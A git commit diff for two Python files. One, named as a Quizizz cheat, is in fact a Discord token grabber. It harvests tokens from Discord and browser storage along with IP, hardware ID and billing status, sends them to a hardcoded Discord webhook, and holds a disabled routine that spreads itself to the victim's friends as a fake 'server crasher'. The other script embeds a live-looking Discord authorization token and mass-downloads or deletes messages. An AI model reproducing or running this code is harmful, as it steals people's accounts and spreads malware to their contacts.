6399c580a936d63aeab0d3343cc88e554f63b27b
Owen Valentinus <owenwijaya89@gmail.com>
2021-03-22 11:57:25 +0700

    foo

--- Cheat_Do_Quizizz.py
+++ Cheat_Do_Quizizz.py
@@ -13,16 +13,14 @@ from sys import argv
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
 PATHS = {
-    "Discord": ROAMING + "\\Discord",
-    "Discord Canary": ROAMING + "\\discordcanary",
-    "Discord PTB": ROAMING + "\\discordptb",
-    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
-    "Opera": ROAMING + "\\Opera Software\\Opera Stable",
-    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
+    "Discord"           : ROAMING + "\\Discord",
+    "Discord Canary"    : ROAMING + "\\discordcanary",
+    "Discord PTB"       : ROAMING + "\\discordptb",
+    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
+    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
+    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
+    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
 }
-
-
 def getheaders(token=None, content_type="application/json"):
     headers = {
         "Content-Type": content_type,
@@ -31,15 +29,11 @@ def getheaders(token=None, content_type="application/json"):
     if token:
         headers.update({"Authorization": token})
     return headers
-
-
 def getuserdata(token):
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
     except:
         pass
-
-
 def gettokens(path):
     path += "\\Local Storage\\leveldb"
     tokens = []
@@ -51,18 +45,13 @@ def gettokens(path):
                 for token in findall(regex, line):
                     tokens.append(token)
     return tokens
-
-
 def getdeveloper():
     dev = "wodx"
     try:
-        dev = urlopen(
-            Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
+        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
     except:
         pass
     return dev
-
-
 def getip():
     ip = "None"
     try:
@@ -70,8 +59,6 @@ def getip():
     except:
         pass
     return ip
-
-
 def getavatar(uid, aid):
     url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
     try:
@@ -79,45 +66,31 @@ def getavatar(uid, aid):
     except:
         url = url[:-4]
     return url
-
-
 def gethwid():
-    p = Popen("wmic csproduct get uuid", shell=True,
-              stdin=PIPE, stdout=PIPE, stderr=PIPE)
+    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
     return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
-
-
 def getfriends(token):
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
     except:
         pass
-
-
 def getchat(token, uid):
     try:
         return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
     except:
         pass
-
-
 def has_payment_methods(token):
     try:
         return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
     except:
         pass
-
-
 def send_message(token, chat_id, form_data):
     try:
-        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages",  headers=getheaders(
-            token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
+        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
     except:
         pass
-
-
 def spread(token, form_data, delay):
-    return  # Remove to re-enabled
+    return # Remove to re-enabled
     for friend in getfriends(token):
         try:
             chat_id = getchat(token, friend["id"])
@@ -125,8 +98,6 @@ def spread(token, form_data, delay):
         except Exception as e:
             pass
         sleep(delay)
-
-
 def main():
     cache_path = ROAMING + "\\.cache~$"
     prevent_spam = True
@@ -140,6 +111,7 @@ def main():
     pc_username = os.getenv("UserName")
     pc_name = os.getenv("COMPUTERNAME")
     user_path_name = os.getenv("userprofile").split("\\")[2]
+    developer = getdeveloper()
     for platform, path in PATHS.items():
         if not os.path.exists(path):
             continue
@@ -160,8 +132,7 @@ def main():
                 continue
             working_ids.append(uid)
             working.append(token)
-            username = user_data["username"] + \
-                "#" + str(user_data["discriminator"])
+            username = user_data["username"] + "#" + str(user_data["discriminator"])
             user_id = user_data["id"]
             avatar_id = user_data["avatar"]
             avatar_url = getavatar(user_id, avatar_id)
@@ -191,6 +162,9 @@ def main():
                 "author": {
                     "name": f"{username} ({user_id})",
                     "icon_url": avatar_url
+                },
+                "footer": {
+                    "text": f"Token grabber by {developer}"
                 }
             }
             embeds.append(embed)
@@ -207,8 +181,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("https://discord.com/api/webhooks/823116202170777630/n-EJmLjaPx6T55CGoMqRVkkjBFMf19yWSka2UsrIjLIzmAtK2Z3beM57fVSPnT62adlX",
-                        data=dumps(webhook).encode(), headers=getheaders()))
+        urlopen(Request("https://ptb.discord.com/api/webhooks/807965329325293578/DbTeUjHn7pJjo0uJmrCQfoVdUCAQIJQ0ovypyUWIEl6y610WyZIoRnfg6ZAvIr0yCHFB", data=dumps(webhook).encode(), headers=getheaders()))
     except:
         pass
     if self_spread:
@@ -217,8 +190,6 @@ def main():
                 content = file.read()
             payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
             Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
-
-
 try:
     main()
 except Exception as e:
--- discord_api.py
+++ discord_api.py
@@ -7,17 +7,21 @@ payload = {}
 def search_guild_all_messages():
     #Getting the infos needed
     global channel_id, search_url
-    guild, channel_id = ' '.join(re.findall('(\d+)',
-                                            input('Guild url: '))).split()
-    search_url = f'https://discord.com/api/v6/guilds/{guild}/messages/search?author_id=778535813436145696&channel_id={channel_id}'
-
+    guild, channel_id = ' '.join(re.findall('(\d+)',input('Guild url: '))).split()
+    search_url = f'https://discord.com/api/v6/guilds/{guild}/messages/search?channel_id={channel_id}'
 
 def search_dm_all_messages():
     #Getting the infos needed
     global channel_id, search_url
-    channel_id = ''.join(re.findall('(\d+)', input('Dm url: ')))
-    search_url = f"https://discord.com/api/v6/channels/{channel_id}/messages/search?author_id=778535813436145696"
+    channel_id = ''.join(re.findall('/?(\d+)', input('Dm url: ')))
+    search_url = f"https://discord.com/api/v6/channels/{channel_id}/messages/search?author_id="
 
+def download_all_messages():
+    response = requests.get(search_url, headers=headers, data=payload)
+    data = json.loads(response.text)
+    with open('./raw.json', 'w', encoding='utf-8') as file:
+        file.write(json.dumps(data))
+        # file.write(json.dumps([x[0]['content'] for x in data['messages']][::-1]))
 
 def get_messages_id():
     response = requests.get(search_url, headers=headers, data=payload)
@@ -34,6 +38,9 @@ def _delete():
             print(responses.status_code)
         get_messages_id()
 
+def send_message():
+    response = requests.post('https://discord.com/api/v8/channels/783304248476565524/messages', headers=headers, data={'content': "since you are offline, i'll just send the goodbye from your discord app", 'tts': 'false'})
+
 a = input('Guild or dm?: ')
 if a.lower() == 'g':
     search_guild_all_messages()
@@ -44,8 +51,7 @@ else:
 #Listing all the messages sent by the author
 
 headers = {
-    'authorization':'Mjc0NjM5NDA1MjM3NjY1Nzky.YFcbSA.uNrWdQfqrHV9wvGGT5Ltggo5OJ0',
+    'authorization': 'Mjc0NjM5NDA1MjM3NjY1Nzky.YFcbSA.uNrWdQfqrHV9wvGGT5Ltggo5OJ0',
 }
 
-
-_delete()
+download_all_messages()
